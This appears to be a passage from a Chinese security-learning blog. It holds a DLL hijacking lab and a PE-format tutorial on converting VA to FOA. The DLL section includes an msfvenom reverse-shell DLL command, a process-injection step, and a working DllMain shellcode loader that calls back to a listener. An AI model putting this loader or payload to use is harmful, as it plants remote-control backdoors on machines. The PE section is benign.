<h4 id="dll-hijack-detect"><a href="#dll-hijack-detect" class="headerlink" title="dll_hijack_detect"></a>dll_hijack_detect</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/adamkramer/dll_hijack_detect/releases">https://github.com/adamkramer/dll_hijack_detect/releases</a></p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016102924938.png" alt="image-20211016102924938"></p>
<p>可以检测到系统上正在运行的进程中的DLL劫持，</p>
<p>不过误报也比较多</p>
<h3 id="复现劫持DLL"><a href="#复现劫持DLL" class="headerlink" title="复现劫持DLL"></a>复现劫持DLL</h3><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>启动应用程序</li>
<li>使用Procesds Explorer等类似的软件查看该应用程序启动后加载的动态链接库</li>
<li>在该应用程序已加载的DLL列表中，查找在KnowDLLs注册表项不存在的DLL</li>
<li>编写从上一步获取到的DLL的劫持dll</li>
<li>将编写好的劫持dll放到该应用程序目录下，重新启动该应用程序，检查是否劫持成功。</li>
</ol>
<h4 id="自动化工具实现DLL劫持上线"><a href="#自动化工具实现DLL劫持上线" class="headerlink" title="自动化工具实现DLL劫持上线"></a>自动化工具实现DLL劫持上线</h4><p>利用msfvenom生成Dll形式的payload</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.43</span><span class="number">.128</span> LPORT=<span class="number">5555</span> -f dll -o SciLexer.dll</span><br></pre></td></tr></table></figure>

<p>劫持前先利用Msfconsole开启监听准备上线。</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016111915554.png" alt="image-20211016111915554"></p>
<p>再将生成的dll文件，放入目标机器当中，打开notepad。利用InjectProc.exe进行自动化注入:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InjectProc.exe dll_inj SciLexer.dll notepad.exe</span><br></pre></td></tr></table></figure>

<p>此时我们可以发现，靶机已经上线，但这种方法由于是msf一键生成的dll 载荷，需要再进行免杀操作，直接使用，百分百会被真实环境中的杀软拦截，且不便于做维权操作。</p>
<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016111706588.png" alt="image-20211016111706588"></p>
<h4 id="手动编写DLL实现上线"><a href="#手动编写DLL实现上线" class="headerlink" title="手动编写DLL实现上线"></a>手动编写DLL实现上线</h4><p>利用vs2019-动态链接库项目</p>
<p>每个DLL文件均有一份dllmain.cpp源文件，其DLL程序入口点在此，实现功能在此处添加</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, <span class="comment">//模块句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call, <span class="comment">//调用原因</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved    <span class="comment">//参数保留</span></span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call) <span class="comment">//根据调用原因选择不同的加载方式</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:    <span class="comment">//DLL被某个进程加载调用</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH: <span class="comment">//DLL被某个线程调用</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH: <span class="comment">//DLL被某个线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:    <span class="comment">//DLL被某个进程卸载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>头文件 ： framework.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN             <span class="comment">// 从 Windows 头文件中排除极少使用的内容</span></span></span><br><span class="line"><span class="comment">// Windows 头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pch.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pch.h: 这是预编译标头文件。</span></span><br><span class="line"><span class="comment">// 下方列出的文件仅编译一次，提高了将来生成的生成性能。</span></span><br><span class="line"><span class="comment">// 这还将影响 IntelliSense 性能，包括代码完成和许多代码浏览功能。</span></span><br><span class="line"><span class="comment">// 但是，如果此处列出的文件中的任何一个在生成之间有更新，它们全部都将被重新编译。</span></span><br><span class="line"><span class="comment">// 请勿在此处添加要频繁更新的文件，这将使得性能优势无效。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试引入Windows.h在dll文件当中，制作MessageBox弹窗</p>
<h4 id="调用DLL"><a href="#调用DLL" class="headerlink" title="调用DLL"></a>调用DLL</h4><h5 id="Python调用"><a href="#Python调用" class="headerlink" title="Python调用"></a>Python调用</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">dll = ctypes.CDLL(<span class="string">&quot;C:\\Users\\86156\\Desktop\\免杀学习\\dll劫持学习\\刘姥姥初试DLL\\Debug\\刘姥姥初试DLL.exe&quot;</span>)</span><br><span class="line">a=dll.func()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016133534638.png" alt="image-20211016133534638"></p>
<h5 id="c-运行时动态连接"><a href="#c-运行时动态连接" class="headerlink" title="c++运行时动态连接"></a>c++运行时动态连接</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//定义一个函数类</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*addfun)</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*messagefun)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//指定加载dll库</span></span><br><span class="line">	HMODULE hdll = <span class="built_in">LoadLibrary</span>(<span class="built_in">LPCWSTR</span>(<span class="string">L&quot;C:\\Users\\86156\\Desktop\\刘姥姥初试DLL.dll&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (hdll != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//程序找到dll并成功载入</span></span><br><span class="line">		messagefun message = (messagefun)<span class="built_in">GetProcAddress</span>(hdll, <span class="string">&quot;message&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (message != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">message</span>();</span><br><span class="line">		<span class="built_in">FreeLibrary</span>(hdll);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;句柄获取失败，刘姥姥得了菜花&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/dll%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0.assets/image-20211016140951886.png" alt="image-20211016140951886"></p>
<p>成功导出dll内的message函数，导入到动态链接.exe中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI DoMagic(LPVOID lpParameter) &#123;</span><br><span class="line"></span><br><span class="line">    unsigned char buffer[]=&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span><br><span class="line">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span><br><span class="line">&quot;\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48\x8b\x72\x50\x4d\x31\xc9&quot;</span><br><span class="line">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span><br><span class="line">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span><br><span class="line">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span><br><span class="line">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48&quot;</span><br><span class="line">&quot;\x18\x44\x8b\x40\x20\x50\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span><br><span class="line">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span><br><span class="line">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span><br><span class="line">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span><br><span class="line">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br><span class="line">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span><br><span class="line">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span><br><span class="line">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span><br><span class="line">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span><br><span class="line">&quot;\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x2b\x80\x41\x54\x49\x89\xe4&quot;</span><br><span class="line">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span><br><span class="line">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span><br><span class="line">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span><br><span class="line">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span><br><span class="line">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span><br><span class="line">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span><br><span class="line">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span><br><span class="line">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span><br><span class="line">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span><br><span class="line">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span><br><span class="line">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span><br><span class="line">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span><br><span class="line">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span><br><span class="line">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span><br><span class="line">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span><br><span class="line">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span><br><span class="line">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;</span><br><span class="line"></span><br><span class="line">    void* exec = VirtualAlloc(0, sizeof(buffer), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    memcpy(exec, buffer, sizeof(buffer));</span><br><span class="line"></span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">) &#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        HANDLE threadHandle;</span><br><span class="line">        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">e</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-PE结构-VA与FOA的转化" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/14/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96/" class="article-date">
      <time datetime="2021-10-14T03:26:38.000Z" itemprop="datePublished">2021-10-14</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/14/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96/">PE结构-VA与FOA的转化</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="VA转FOA"><a href="#VA转FOA" class="headerlink" title="VA转FOA"></a>VA转FOA</h3><p>相应名词概念</p>
<table>
<thead>
<tr>
<th></th>
<th>对应结构体成员</th>
<th>英文全称</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>VA</td>
<td>_IMAGE_SECTION_HEADER.VirtualAddress</td>
<td>Virtual Address</td>
<td>在内存中的虚拟地址</td>
</tr>
<tr>
<td>RVA</td>
<td>_IMAGE_SECTION_HEADER.VirtualAddress</td>
<td>Relative Virtual Address</td>
<td>相对虚拟地址</td>
</tr>
<tr>
<td>FOA</td>
<td>_IMAGE_SECTION_HEADER.PointerToRawData</td>
<td>File Offset Address</td>
<td>文件偏移地址</td>
</tr>
</tbody></table>
<h3 id="为什么需要学习VA与FOA之间的转换"><a href="#为什么需要学习VA与FOA之间的转换" class="headerlink" title="为什么需要学习VA与FOA之间的转换"></a>为什么需要学习VA与FOA之间的转换</h3><p>此处需要引入一个问题：<strong>如何改变一个全局变量的初始值</strong></p>
<ul>
<li>如果一个全局变量有<strong>初始值</strong>，那么他的初试值一定是存储于PE文件中的。</li>
<li>如果一个全局变量没有<strong>初始值</strong>，那么在PE文件中就没有存储它的位置，只有当PE文件加载到内存中时，才会给它分配空间</li>
</ul>
<p>修改程序的数据时，如果不懂的如何转换VA与FOA，我们在修改内存全局变量的时候就只能通过CE等辅助工具进行搜索修改了。</p>
<h3 id="全局变量初始值Demo"><a href="#全局变量初始值Demo" class="headerlink" title="全局变量初始值Demo"></a>全局变量初始值Demo</h3><p>利用c语言输出全局变量的值与地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> global = <span class="number">0x610</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//输出全局变量地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address:%X\n&quot;</span>, &amp;global);</span><br><span class="line">    <span class="comment">//输出全局变量的值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value:0x%X\n&quot;</span>, global);</span><br><span class="line">    <span class="comment">//暂停一下，防止窗口运行完自动关闭</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014123921284.png" alt="image-20211014123921284"></p>
<p>可以看到程序将全局变量地址与值打印到了dos窗口之上</p>
<h3 id="修改全局变量的初始值"><a href="#修改全局变量的初始值" class="headerlink" title="修改全局变量的初始值"></a>修改全局变量的初始值</h3><p>注意，在调试的时候，要选择低版本windows 如windows 2008，高版本windows启用随机内存地址保护，不利于我们调试，一开始踩了这个大坑，又空耗了1个多小时….</p>
<p>此时我们可以看到在运行时，全局变量的地址为0A425A30</p>
<p>此时我们如果使用16进制编辑器去寻找这个地址，我们是无法发现全局变量的。</p>
<p>这是由于PE文件在载入内存中时的地址是虚拟地址（VA）</p>
<p>VA = ImageBase + RVA    </p>
<p>也就是说虚拟地址 = PE文件载入内存中后的基地址 + 相对虚拟地址（相对于基地址看齐）</p>
<p>而基地址是ImageBase字段的值，这点我们可以从PE头中获知</p>
<p>于是我们可以计算得出 RVA = VA - ImageBase</p>
<p>而其在PE文件中的地址为FOA（文件偏移地址）</p>
<p>最终问题就也就变成了 RVA与FOA的转换</p>
<p><strong>通俗点来讲，就是说假设我们通过运行程序拿到RVA，想要获知FOA，就需要通过一定手段利用RVA来获知FOA，从而定位到我们想要的一个函数或变量的地址</strong></p>
<h3 id="VA到FOA转换流程"><a href="#VA到FOA转换流程" class="headerlink" title="VA到FOA转换流程"></a>VA到FOA转换流程</h3><p>1.得到RVA的值： RVA = VA - ImageBase </p>
<p>2.判断RVA是否在PE文件头内</p>
<ul>
<li>如果在，则FOA=RVA</li>
<li>如果不在，判断RVA在哪个节（区块），差值 = RVA - 区块.virtualAddress(RVA),    FOA = 区块.PointerToRawData + 差值</li>
</ul>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014114852057.png" alt="image-20211014114852057"></p>
<h3 id="根据流程转换"><a href="#根据流程转换" class="headerlink" title="根据流程转换"></a>根据流程转换</h3><p><strong>1.拿到RVA的值： RVA = VA - ImageBase</strong></p>
<p>首先拿到ImageBase值</p>
<p>利用StudyPE来查看</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014124137197.png" alt="image-20211014124137197"></p>
<p>显然，ImageBase的值为00400000</p>
<p>于是可以算出 RVA = VA - ImageBase =  425a30h - 400000h = 25A30h</p>
<p><strong>2.判断RVA是否位于PE文件头之内</strong></p>
<p>可以看到PE文件头的地址在F7h处结尾，而14A30h远远大于，因此不在pe文件头处</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014125244591.png" alt="image-20211014125244591"></p>
<p>很显然，1F600已经超出了PE文件的最大范围，这证明我们定位的RVA ≠FOA</p>
<p>3.<strong>判断RVA属于哪那一节</strong></p>
<p>根据RVA &gt; = 区块.VirtualAddress </p>
<p>RVA &lt; 区块.VirtualAddress + 当前节内存对齐后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RVA&gt;=节.VirtualAddress</span><br><span class="line"></span><br><span class="line">RVA&lt;节.VirtualAddress + 当前节内存对齐后的大小=节.VirtualAddress +[(Max&#123;节.Misc，节.SizeOfRawData&#125;)÷SectionAlignment]向上取整×SectionAlignment</span><br></pre></td></tr></table></figure>

<ul>
<li>节.sizeOfRawData 是节文件对齐后的大小</li>
<li>节.Misc是节的实际大小</li>
</ul>
<p><strong>内存对齐后的大小 = [Max{实际的大小,文件对齐后的大小}÷内存对齐]向上取整×内存对齐</strong></p>
<p>向上取整的意思就是 如果除后的结果为整数就直接为结果，如果除后的结果带小数则取整然后加一</p>
<p>例子：[5÷2]向上取整= 2.5取整+1=2+1=3，[4÷2]向上取整=2</p>
<p>根据工具可知，RVA = 0X25A30 处于.idata区块之中 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014125443850.png" alt="image-20211014125443850"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014130005638.png" alt="image-20211014130005638"></p>
<p>程序在内存中的对齐基数为SectionAlign设置的0x1000</p>
<p>其实际大小 = 区块.Misc 在 StudyPE中显示为V.Size = 0x5604</p>
<p>Max{节.Misc,节.SizeofRawData} = Max{0x5604,0x4000} = 0x5604</p>
<p>内存对齐后的大小 = {0x5604 / 内存对齐} 向上取整*内存对齐 = (0x5604/0x1000)向上取整 * 0x1000 = (5 + 1 ) * 0x1000 = 0x6000</p>
<p>RVA&gt;=0x25000</p>
<p>RVA&lt;0X25000 + 内存对齐后的大小 = 0x25000 + 0x6000 = 0x2A000</p>
<p>差值 = RVA - 节.VirtualAddress = 0x25A30 - 0X25000 = 0XA30</p>
<p>PointerToRawData 在工具中显示为Offset，为0X25000</p>
<p>FOA = 节.PointerToRawData + 差值 = 0x25000 + 0XA30= 0x25A30</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014131006511.png" alt="image-20211014131006511"></p>
<p>由此，找到了数值地址，进行修改为65535,再次运行，发现值已被修改.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-VA%E4%B8%8EFOA%E7%9A%84%E8%BD%AC%E5%8C%96.assets/image-20211014131136540.png" alt="image-20211014131136540"></p>
<h3 id="利用代码实现VA转FOA"><a href="#利用代码实现VA转FOA" class="headerlink" title="利用代码实现VA转FOA"></a>利用代码实现VA转FOA</h3><p><strong>代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 